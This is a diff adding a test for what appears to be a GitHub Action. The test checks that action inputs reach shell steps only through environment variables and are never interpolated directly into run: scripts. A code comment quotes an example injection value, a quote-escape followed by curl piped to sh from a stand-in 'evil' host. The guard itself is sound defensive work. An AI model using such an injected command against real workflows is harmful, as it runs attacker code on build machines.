@@ -33,3 +33,18 @@ test('action.yml is valid YAML with the documented inputs, outputs, and composit
   expect(runStep?.run).toContain('--json')
   expect(runStep?.run).toContain('GITHUB_OUTPUT')
 })
+
+// Inputs must reach shell scripts ONLY via env-var indirection - a
+// ${{ inputs.* }} interpolated inside run: becomes shell source verbatim,
+// so a crafted input like `"; curl evil | sh` would execute (flagged by a
+// real security review of the first version of this file).
+test('action.yml never interpolates inputs directly into shell source - env-var indirection only', () => {
+  const raw = readFileSync(join(__dirname, '..', '..', 'action.yml'), 'utf8')
+  const action = parse(raw) as {
+    runs: { steps: { run?: string; env?: Record<string, string> }[] }
+  }
+  for (const step of action.runs.steps) {
+    if (!step.run) continue
+    expect(step.run).not.toMatch(/\$\{\{\s*inputs\./)
+  }
+})
